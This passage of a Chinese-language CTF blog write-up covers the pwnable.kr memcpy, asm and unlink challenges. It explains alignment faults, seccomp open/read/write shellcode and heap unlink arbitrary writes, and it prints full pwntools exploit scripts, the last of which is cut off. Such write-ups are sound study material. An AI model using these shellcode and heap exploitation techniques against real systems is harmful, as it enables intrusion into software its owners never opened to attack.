class="line"></span><br></pre></td></tr></table></figure><p>源码实现了两种不同的 memcpy，要求我们帮忙测试一下，需要我们输入 10 个 size，这 10 个 size 的范围如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span> <span class="number">16</span></span><br><span class="line"><span class="number">16</span> <span class="number">32</span></span><br><span class="line"><span class="number">32</span> <span class="number">64</span></span><br><span class="line"><span class="number">64</span> <span class="number">128</span></span><br><span class="line"><span class="number">128</span> <span class="number">256</span></span><br><span class="line"><span class="number">256</span> <span class="number">512</span></span><br><span class="line"><span class="number">512</span> <span class="number">1024</span></span><br><span class="line"><span class="number">1024</span> <span class="number">2048</span></span><br><span class="line"><span class="number">2048</span> <span class="number">4096</span></span><br><span class="line"><span class="number">4096</span> <span class="number">8192</span></span><br></pre></td></tr></table></figure><p>10 个 size，一共进行 10 次测试，每次测试分别使用 slow_memcpy 和 fast_memcpy 拷贝 size 大小的内存到 malloc 出来的一块 size 大小的 dest 里，只要我们能把这 10 次测试都做完，就能拿到 flag，理论上 size 越小，测试越快，那我们先试一试用范围内最小的 size，<code>8 16 32 64 128 256 512 1024 2048 4096</code>，但是只能进行 4 次半测试就退出了，表示程序执行第 5 次测试的 fast_memcpy 的时候出现了问题。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/16.png"></p><p>slow_memcpy 非常简单，直接用数组一个元素一个元素的赋值，而 fast_memcpy 则是在汇编层面上用 movdqa 和 movntps 以 64 字节为一块的单位拷贝，先看一下 movdqa 和 movntps 这两个指令都是在干什么。</p><blockquote><p>movdqa:</p><p>Moves 128, 256 or 512 bits of packed doubleword/quadword integer values from the source operand (the second operand) to the destination operand (the first operand). This instruction can be used to load a vector register from an int32/int64 memory location, to store the contents of a vector register into an int32/int64 memory location, or to move data between two ZMM registers. When the source or destination operand is a memory operand, the operand must be aligned on a 16 (EVEX.128)/32 (EVEX.256)/64 (EVEX.512)-byte boundary or a general-protection exception (#GP) will be generated. To move integer data to and from unaligned memory locations, use the VMOVDQU instruction.</p><p>movntps:</p><p>Moves the packed single-precision floating-point values in the source operand (second operand) to the destination operand (first operand) using a non-temporal hint to prevent caching of the data during the write to memory. The source operand is an XMM register, YMM register or ZMM register, which is assumed to contain packed single-precision, floating-pointing. The destination operand is a 128-bit, 256-bit or 512-bit memory location. The memory operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary otherwise a general-protection exception (#GP) will be generated.</p></blockquote><p>movdqa 可以从 src 移动 16 字节，32 字节或 64 字节的打包的双字或四字整数到 dst，当 src 是一个来自内存中的数据时，该数据必须以 16 字节，32 字节或 64 字节对齐。movntps 可以从 src 移动打包的单精度浮点数到 dst，当 src 或 dst 是一个内存中的数据时，需要以 16 字节，32 字节或 64 字节对齐。在 fast_memcpy 中，若要拷贝的大小超过 64 字节时，使用 movdqa 将一个 64 字节来自内存的块数据分别移动 16 字节到 4 个寄存器中，然后使用 movntps 从这 4 个寄存器中每次移动 16 字节到目标内存中，因此，src 和 dst 在内存中必须以 16 字节对齐。</p><p>源码里直接给了编译命令 <code>gcc -o memcpy memcpy.c -m32 -lm</code>，本地手动编译，输入刚才的数据执行，发现没有任何问题。最后实在无奈看了网上别人的 writeup，这个程序的主要问题在于内存对齐，movdqa 和 movntps 都要求内存数据 16 字节对齐，而在编译命令中指明这是 32 位的程序，默认 8 字节对齐，因此在使用 fast_memcpy 的时候，malloc 出来的 chunk 的 ** 内存位置 **（注意不是 chunk 的 size）并不是 16 字节对齐，所以我们就需要从 size 为 64 字节开始，手动加上 8 调整内存中的 chunk 为 16 字节对齐，最后的 size 为 <code>8 16 32 72 136 264 520 1032 2056 4096</code>。至于为什么本地编译 32 位程序执行没有出错，目前尚不清楚。</p><h1 id="asm-6-pt"><a href="#asm-6-pt" class="headerlink" title="asm (6 pt)"></a>asm (6 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LENGTH 128</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sandbox</span><span class="params">()</span>&#123;</span><br><span class="line">    scmp_filter_ctx ctx = seccomp_init (SCMP_ACT_KILL);</span><br><span class="line">    <span class="keyword">if</span> (ctx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;seccomp error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    seccomp_rule_add (ctx, SCMP_ACT_ALLOW, SCMP_SYS (open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add (ctx, SCMP_ACT_ALLOW, SCMP_SYS (read), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add (ctx, SCMP_ACT_ALLOW, SCMP_SYS (write), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add (ctx, SCMP_ACT_ALLOW, SCMP_SYS (<span class="built_in">exit</span>), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add (ctx, SCMP_ACT_ALLOW, SCMP_SYS (exit_group), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (seccomp_load (ctx) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        seccomp_release (ctx);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;seccomp error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    seccomp_release (ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> stub [] = <span class="string">&quot;\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff&quot;</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> filter [<span class="number">256</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv [])</span>&#123;</span><br><span class="line"></span><br><span class="line">    setvbuf (<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf (<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to shellcoding practice challenge.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try to make shellcode that spits flag using open ()/read ()/write () systemcalls only.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;If this does not challenge you. you should play &#x27;asg&#x27; challenge :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* sh = (<span class="type">char</span>*) mmap (<span class="number">0x41414000</span>, <span class="number">0x1000</span>, <span class="number">7</span>, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(sh, <span class="number">0x90</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(sh, stub, <span class="built_in">strlen</span>(stub));</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> offset = <span class="keyword">sizeof</span>(stub);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;give me your x64 shellcode: &quot;</span>);</span><br><span class="line">    read (<span class="number">0</span>, sh+offset, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    alarm (<span class="number">10</span>);</span><br><span class="line">    chroot (<span class="string">&quot;/home/asm_pwn&quot;</span>);    <span class="comment">//you are in chroot jail. so you can&#x27;t use symlink in /tmp</span></span><br><span class="line">    sandbox ();</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>)) sh)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又是一个 orw 沙箱，只能用 open，read 和 write 系统写一段 shellcode 读 flag，但是 flag 文件名特别长 <code>this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong</code>，而且还会强制在 shellcode 之前加入一段 stub 清空 rip 和 rsp 以外的所有寄存器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x41414000:    xor    rax,rax</span><br><span class="line">0x41414003:    xor    rbx,rbx</span><br><span class="line">0x41414006:    xor    rcx,rcx</span><br><span class="line">0x41414009:    xor    rdx,rdx</span><br><span class="line">0x4141400c:    xor    rsi,rsi</span><br><span class="line">0x4141400f:    xor    rdi,rdi</span><br><span class="line">0x41414012:    xor    rbp,rbp</span><br><span class="line">0x41414015:    xor    r8,r8</span><br><span class="line">0x41414018:    xor    r9,r9</span><br><span class="line">0x4141401b:    xor    r10,r10</span><br><span class="line">0x4141401e:    xor    r11,r11</span><br><span class="line">0x41414021:    xor    r12,r12</span><br><span class="line">0x41414024:    xor    r13,r13</span><br><span class="line">0x41414027:    xor    r14,r14</span><br><span class="line">0x4141402a:    xor    r15,r15</span><br></pre></td></tr></table></figure><p>首先 esp 没被清空，所以我们可以用栈保存 flag 的文件名，然后用 open 系统调用拿到文件的 fd，之后用 read 通过 fd 读取 flag 到栈上，最后用 write 系统调用把栈上的 flag 打印出来，最终的 exp 如下。最开始的 <code>push rax</code> 是为了截断栈上的 flag 文件名，之后利用 rax 和 push 将 flag 文件名放到栈里，需要注意的是在 mov 立即数的时候，若立即数长度小于 64 位，应该 mov 到对应长度的寄存器里，否则会出现坏字符，例如 <code>mov rax,0x1</code>，这样 shellcode 就会出现 <code>\x00</code>，应该使用 <code>mov al,0x1</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">PORT = <span class="number">9026</span></span><br><span class="line"></span><br><span class="line">context.clear (arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.update (terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update (log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF (&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF (<span class="string">&quot;./asm&quot;</span>)</span><br><span class="line">pg = cyclic_gen ()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote (HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process (elf.path, env=env)</span><br><span class="line"><span class="comment"># int open (const char * pathname, int flags, mode_t mode);</span></span><br><span class="line"><span class="comment"># #define O_RDONLY 00000000</span></span><br><span class="line"><span class="comment"># fd = open (&quot;/hom e/or w///flag&quot;, O_RDONLY)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ssize_t read (int fd, void * buf, size_t count);</span></span><br><span class="line"><span class="comment"># read (fd, buf, 20)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ssize_t write (int fd, const void * buf, size_t count);</span></span><br><span class="line"><span class="comment"># write (1, buf, 20)</span></span><br><span class="line">flag = <span class="string">&#x27;.////////this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">LEN = <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) % LEN == <span class="number">0</span> </span><br><span class="line"></span><br><span class="line">flags = [f.encode (<span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> f <span class="keyword">in</span> (flag [i:i+LEN] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), LEN))]</span><br><span class="line"></span><br><span class="line">shellcode = asm (<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">% s;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">mov al,0x2;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">xor rdi,rdi;</span></span><br><span class="line"><span class="string">mov dil,al;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">mov al,0x50;</span></span><br><span class="line"><span class="string">mov rdx,rax;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">mov dil,0x1;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rdx,rax;</span></span><br><span class="line"><span class="string">mov al,0x1;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (<span class="string">&#x27;;\n&#x27;</span>.join (((<span class="string">&#x27;mov rax,0x% s;\npush rax&#x27;</span> % f) <span class="keyword">for</span> f <span class="keyword">in</span> flags))))</span><br><span class="line"><span class="keyword">assert</span> <span class="string">&#x27;\x00&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> shellcode</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(shellcode) &lt;= <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause ()</span></span><br><span class="line">conn.sendafter (<span class="string">&#x27;give me your x64 shellcode: &#x27;</span>, shellcode)</span><br><span class="line">log.success (<span class="string">&#x27;Get flag: &#x27;</span> + conn.recvline ())</span><br><span class="line"></span><br><span class="line">conn.interactive ()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="unlink-10-pt"><a href="#unlink-10-pt" class="headerlink" title="unlink (10 pt)"></a>unlink (10 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span></span><br><span class="line">    <span class="type">char</span> buf [<span class="number">8</span>];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>&#123;</span><br><span class="line">    system (<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unlink</span><span class="params">(OBJ* P)</span>&#123;</span><br><span class="line">    OBJ* BK;</span><br><span class="line">    OBJ* FD;</span><br><span class="line">    BK=P-&gt;bk;</span><br><span class="line">    FD=P-&gt;fd;</span><br><span class="line">    FD-&gt;bk=BK;</span><br><span class="line">    BK-&gt;fd=FD;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv [])</span>&#123;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">    OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">    OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">    OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//double linked list: A &lt;-&gt; B &lt;-&gt; C</span></span><br><span class="line">    A-&gt;fd = B;</span><br><span class="line">    B-&gt;bk = A;</span><br><span class="line">    B-&gt;fd = C;</span><br><span class="line">    C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;here is stack address leak: % p\n&quot;</span>, &amp;A);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;here is heap address leak: % p\n&quot;</span>, A);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;now that you have leaks, get shell!\n&quot;</span>);</span><br><span class="line">    <span class="comment">//heap overflow!</span></span><br><span class="line">    gets (A-&gt;buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//exploit this unlink!</span></span><br><span class="line">    unlink (B);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最简单的一个 unlink 漏洞，该给的都给了，甚至连栈上和堆上的地址都给了，和 malloc 的 unlink 相比也没有任何的安全检查。unlink 的最基本原理就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd = p-&gt;fd;</span><br><span class="line">bk = p-&gt;bk;</span><br><span class="line">fd-&gt;bk = bk;</span><br><span class="line">bk-&gt;fd = fd;</span><br></pre></td></tr></table></figure><p>如果我们可以控制 p 的 fd 和 bk，就可以实现任意地址写，其中 fd 为某个地址，bk 为我们要写入的值，如下所示，其中 a 和 b 需要可写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = a;</span><br><span class="line">p-&gt;bk = b;</span><br><span class="line"></span><br><span class="line">fd = p-&gt;fd = a;</span><br><span class="line">bk = p-&gt;bk = b;</span><br><span class="line"></span><br><span class="line">fd-&gt;bk = *(fd + <span class="number">4</span>) = *(a + <span class="number">4</span>) = bk = b;</span><br><span class="line">bk-&gt;fd = *(bk + <span class="number">0</span>) = *b = fd = a;</span><br></pre></td></tr></table></figure><p>题目最开始 malloc 了 1024 的 chunk，然后 malloc 了 3 个 OBJ：A，B 和 C，组成了一个双向链表，A 的 buf 有一个堆溢出，最后 unlink B 触发 unlink 漏洞。由于 B 在 A 的后面 malloc，所以 B 在 A 的物理高地址相邻，通过 A 可以修改 B 的 fd 和 bk。我们的最终目的是在 main 函数结束 ret 的时候跳转到 shell 的地址，那么就需要控制栈顶 esp 的值，而在 main 的最后有一个 ecx，如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x080485f2 &lt;+195&gt;:    call   0x8048504 &lt;unlink&gt;</span><br><span class="line">0x080485f7 &lt;+200&gt;:    add    esp,0x10</span><br><span class="line">0x080485fa &lt;+203&gt;:    mov    eax,0x0</span><br><span class="line">0x080485ff &lt;+208&gt;:    mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">0x08048602 &lt;+211&gt;:    leave</span><br><span class="line">0x08048603 &lt;+212&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">0x08048606 &lt;+215&gt;:    ret</span><br></pre></td></tr></table></figure><p>首先把 ebp-4 的值放到 ecx 里，然后用 leave 缩减栈，最后在 ret 前有一个 lea 可以把 ecx-4 的值写入 esp，那么如果我们可以控制 ebp-4 的值，那么就可以控制 ecx，最后就可以控制 esp 了，ebp 是固定的，通过提供的栈地址很容易可以算出 ebp-4 的位置位于提供的栈地址 + 16 处。我们可以将 shell 地址写到堆上，然后通过 unlink 写入到 ebp-4，最后通过 lea 将 shell 地址写入 esp，ret 的时候就可以控制 eip 跳转到 shell 地址了，通过查看堆上内容，可以算出我们写入的 shell 偏移为提供的堆地址 + 8 处（+8 是因为要跳过 A 的 fd 和 bk），最后由于 ecx 在 lea 前还减了 4，我们要再补上 4。还有需要注意的是 malloc 出的 chunk 的里的 buf 大小为 8 字节，除去我们输入的 4 字节的 shell 地址，还有 4 字节的 junk 需要填充，之后还需要填充 B 的 chunk 的 prev_size 和 size 一共 8 个字节，然后就可以覆盖 B 的 fd 和 bk。最终的 exp 如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">PORT = <span class="number">9026</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.clear (arch=&#x27;amd64&#x27;)</span></span><br><span class="line">context.update (terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update (log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF (&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF (<span class="string">&quot;/home/unlink/unlink&quot;</span>)</span><br><span 